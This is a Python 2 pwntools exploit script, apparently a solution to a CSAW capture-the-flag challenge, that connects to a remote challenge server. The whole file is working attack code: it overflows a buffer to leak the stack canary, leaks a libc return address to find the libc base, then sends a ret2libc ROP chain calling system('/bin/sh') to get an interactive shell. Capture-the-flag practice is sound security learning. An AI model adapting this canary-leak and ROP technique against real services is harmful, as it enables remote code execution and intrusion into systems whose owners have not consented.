#!/usr/bin/env python2

from pwn import *

# offsets: canary: 168 (169), ret (184)
context.log_level = 'DEBUG'
#r = process("scv")
#r = process("linux_serverx64")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = remote("pwn.chal.csaw.io", 3764)
libc = ELF("libc-2.23.so")
pop_rdi = 0x400ea3
# leak stack canary
r.readuntil(">>")
r.sendline("1")
buf = "a" * 169 # stack canary starts with \x00, need to replace it later
r.recvuntil(">>")
r.send(buf)

r.recvuntil(">>")
r.sendline("2")
r.recvuntil("a" * 169)
canary = "\x00" + r.recvn(7)
log.info("Leaked canary: " + enhex(canary))

# now leak libc
# on my libc: 0x21b45 is the offset to leak
# look for instruction after call rax, right before call near ptr exit in __libc_start_main

r.recvuntil(">>")
r.sendline("1")
buf = "b" * 184
r.recvuntil(">>")
r.send(buf)

# get it, leak
#off = 0x21b45
off = 0x20830
r.recvuntil(">>")
r.sendline("2")
r.recvuntil("b" * 184)
ret_main_addr = u64(r.recvn(6) + "\x00\x00")
libc_base = ret_main_addr - off
log.info("Libc base: " + hex(libc_base))
# now build our ROP chain
buf = "a" * 168 + canary
while len(buf) != 184:
    buf += "b"
buf += p64(pop_rdi)
# get /bin/sh
bin_sh = next(libc.search("/bin/sh\x00"))
log.info("SH offset: " + hex(bin_sh))
buf += p64(libc_base + bin_sh)
# now system!
sys = libc.symbols["system"]
buf += p64(libc_base + sys)

r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>")
r.send(buf)
r.recvuntil(">>")
r.sendline("3")
r.interactive()
